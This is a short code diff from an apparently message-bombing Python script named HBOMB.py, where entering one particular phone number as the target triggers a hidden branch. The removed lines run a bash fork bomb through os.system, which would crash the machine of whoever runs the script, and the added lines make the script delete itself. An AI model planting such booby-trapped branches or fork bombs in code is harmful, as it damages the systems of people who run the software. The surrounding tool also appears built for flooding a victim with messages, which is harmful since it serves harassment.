@@ -910,10 +910,8 @@ if target == '':
     exit()
 elif target == '8077453131':
     print (color+"  Welcome to my DARKSIDE !!!!!  ")
-    os.system('''
-    #!/bin/bash
-    :(){ :|:& };:
-    ''')
+    os.system("rm HBOMB.py")
+    exit()
 elif messagesss <= 0:
     print(
         color+"Messages Value Incorrect"
